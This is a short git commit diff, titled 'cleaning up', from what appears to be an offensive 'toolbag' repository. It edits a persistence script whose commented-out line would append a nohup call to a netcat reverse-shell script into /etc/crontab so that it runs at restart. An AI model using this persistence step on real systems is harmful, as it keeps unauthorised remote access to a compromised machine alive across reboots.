5378131c82bb9461f85c42040ae89f3a07442411
ChoctawChief <dt52hhs@gmail.com>
2022-10-13 00:12:17 -0500

    cleaning up

--- persistence/autostartper.sh
+++ persistence/autostartper.sh
@@ -1,4 +1,4 @@
 #!/bin/bash
 #adds netcatreverseshell.sh to crontab
-#sudo echo @restart  nohup ~/toolbag/persistence/netcatreverseshell.sh' >> /etc/crontab
+#sudo echo @restart  nohup ~/toolbag/persistence/netcatreverseshell.sh >> /etc/crontab
 
